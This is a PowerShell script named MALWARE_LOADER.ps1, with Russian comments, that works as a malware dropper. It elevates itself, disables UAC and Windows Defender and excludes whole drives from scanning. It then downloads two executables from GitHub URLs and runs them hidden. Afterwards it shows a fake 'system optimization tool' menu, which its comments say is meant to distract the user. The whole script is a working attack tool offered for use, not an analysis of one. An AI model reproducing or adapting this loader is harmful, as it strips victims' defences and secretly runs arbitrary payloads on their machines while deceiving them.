# MALWARE_LOADER.ps1
# ПОЛНЫЙ ЛОАДЕР С ОТКЛЮЧЕНИЕМ ЗАЩИТЫ И ЗАГРУЗКОЙ ТВОИХ EXE

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[*] Запрос прав администратора..." -ForegroundColor Red
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    Exit
}

Write-Host "[*] Запуск с правами администратора" -ForegroundColor Green

# ОТКЛЮЧЕНИЕ UAC
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force

# ОТКЛЮЧЕНИЕ WINDOWS DEFENDER
Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:APPDATA" -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "Wave.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "Fx.exe" -ErrorAction SilentlyContinue

Write-Host "[*] Windows Defender отключен" -ForegroundColor Green

# НАСТРОЙКА ПРОКСИ (опционально - раскомментировать если нужно)
# $proxyString = "http://proxy_ip:port"
# [System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($proxyString)

# ЗАГРУЗКА ТВОИХ EXE ФАЙЛОВ
$url1 = "https://github.com/enosenso/site/raw/refs/heads/main/Wave.exe"
$url2 = "https://github.com/kilordow/Fx.exe/releases/download/lol/Fx.exe"

$path1 = "$env:TEMP\Wave.exe"
$path2 = "$env:TEMP\Fx.exe"

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Write-Host "[*] Загрузка Wave.exe..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Wave.exe загружен: $path1" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка загрузки Wave.exe: $_" -ForegroundColor Red
}

Write-Host "[*] Загрузка Fx.exe..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Fx.exe загружен: $path2" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка загрузки Fx.exe: $_" -ForegroundColor Red
}

# ЗАПУСК EXE ФАЙЛОВ
if (Test-Path $path1) {
    Write-Host "[*] Запуск Wave.exe..." -ForegroundColor Cyan
    Start-Process -FilePath $path1 -WindowStyle Hidden
    Write-Host "[+] Wave.exe запущен" -ForegroundColor Green
}

if (Test-Path $path2) {
    Write-Host "[*] Запуск Fx.exe..." -ForegroundColor Cyan
    Start-Process -FilePath $path2 -WindowStyle Hidden
    Write-Host "[+] Fx.exe запущен" -ForegroundColor Green
}

# СКРЫТЫЙ РЕЖИМ - ОЧИСТКА ЛОГОВ
Clear-Host

# ФЕЙКОВЫЙ ИНТЕРФЕЙС (для отвлечения внимания)
Write-Host ""
Write-Host "================================================" -ForegroundColor Magenta
Write-Host "          SYSTEM OPTIMIZATION TOOL v3.1" -ForegroundColor Yellow
Write-Host "================================================" -ForegroundColor Magenta
Write-Host ""

Write-Host "[1] Очистка временных файлов" -ForegroundColor Green
Write-Host "[2] Оптимизация реестра" -ForegroundColor Yellow
Write-Host "[3] Дефрагментация диска" -ForegroundColor Cyan
Write-Host "[4] Выход" -ForegroundColor DarkRed
Write-Host ""

$choice = Read-Host "Выберите опцию (1-4)"

switch ($choice) {
    "1" { Write-Host "[*] Очистка выполнена" -ForegroundColor Green }
    "2" { Write-Host "[*] Оптимизация завершена" -ForegroundColor Green }
    "3" { Write-Host "[*] Дефрагментация запущена" -ForegroundColor Green }
    "4" { Write-Host "[*] Выход..." -ForegroundColor DarkRed }
}

# ЗАДЕРЖКА ПЕРЕД ЗАВЕРШЕНИЕМ
Start-Sleep -Seconds 2

# ОЧИСТКА (опционально - удалить если нужно оставить файлы)
# Start-Sleep -Seconds 30
# Remove-Item $path1 -Force -ErrorAction SilentlyContinue
# Remove-Item $path2 -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "[+] Загрузка завершена" -ForegroundColor DarkGreen